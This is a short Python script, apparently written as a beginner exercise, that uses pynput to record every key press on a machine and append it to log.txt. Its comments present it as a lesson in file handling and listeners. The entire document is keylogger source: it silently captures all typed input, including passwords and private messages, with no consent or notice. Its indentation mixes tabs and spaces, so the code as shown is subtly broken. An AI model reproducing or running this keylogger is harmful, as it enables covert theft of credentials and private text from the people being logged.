from pynput.keyboard import Listener

# storing the keystrokes in a text file
# File Handling - How to read, write, and append to a file
# Listeners - Listen to keystrokes
# Use of the 'with' keyword - Release memory automatically

def write_to_file(key):
	letter = str(key) # convert key values to string
	letter = letter.replace("'","") # to remove single quotes

	if letter == 'Key.space': # to get clean result on log file
		letter = ' '
	if letter == 'Key.shift_r':
        letter = ''
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"

	with open("log.txt", 'a') as f: # Modes: r - reading,	w - writing, a - appending to a file
		f.write(letter)

with Listener(on_press=write_to_file) as l: # Listen to keystrokes
	l.join() # join single letter togather 